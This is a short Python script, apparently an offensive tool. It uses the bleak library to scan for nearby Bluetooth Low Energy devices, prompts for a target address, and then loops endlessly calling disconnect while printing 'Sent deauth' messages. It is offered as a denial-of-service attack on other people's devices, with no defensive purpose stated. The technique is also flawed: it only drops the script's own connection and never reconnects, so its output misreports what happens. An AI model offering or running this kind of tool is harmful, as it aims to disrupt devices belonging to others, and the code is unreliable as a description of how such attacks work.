import asyncio
from bleak import BleakScanner, BleakClient

async def ble_deauth(target_address, interval=0.1):  # Interval in seconds
    async with BleakClient(target_address) as client:
        while True:
            try:
                await client.disconnect()
                print(f"Sent deauth to {target_address}")
            except Exception as e:
                print(f"Error: {e}")
            await asyncio.sleep(interval)

async def detection_callback(device, advertisement_data):
    print(f"[{device.address}] {device.name} ({advertisement_data.rssi} dBm)")

async def main():
    print("Scanning for BLE devices...")

    # Create the scanner with the callback
    scanner = BleakScanner(detection_callback=detection_callback)

    await scanner.start()
    await asyncio.sleep(5)  # Scan for 5 seconds
    await scanner.stop()

    target_address = input("Enter the target device address: ")
    await ble_deauth(target_address)

if __name__ == "__main__":
    asyncio.run(main())
